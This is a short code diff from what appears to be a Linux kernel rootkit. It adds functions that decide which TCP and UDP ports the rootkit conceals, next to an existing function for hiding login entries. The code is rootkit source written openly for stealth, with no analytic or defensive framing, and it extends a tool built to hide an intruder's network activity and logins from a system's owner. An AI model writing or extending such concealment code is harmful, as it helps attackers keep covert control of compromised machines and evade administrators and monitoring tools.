@@ -209,3 +209,25 @@ int rooti_hide_login_entry(char *user_buf, size_t count)
     kfree(kernel_buf);
     return 0;
 }
+
+// Indicates whether the given TCP port should be hidden by the rootkit
+bool rooti_should_hide_tcp_port(unsigned short port)
+{
+    for (int i = 0; i < ROOTI_HIDDEN_TCP_PORTS_COUNT; i++) {
+        if (ROOTI_HIDDEN_TCP_PORTS[i] == port) {
+            return true;
+        }
+    }
+    return false;
+}
+
+// Indicates whether the given UDP port should be hidden by the rootkit
+bool rooti_should_hide_udp_port(unsigned short port)
+{
+    for (int i = 0; i < ROOTI_HIDDEN_UDP_PORTS_COUNT; i++) {
+        if (ROOTI_HIDDEN_UDP_PORTS[i] == port) {
+            return true;
+        }
+    }
+    return false;
+}
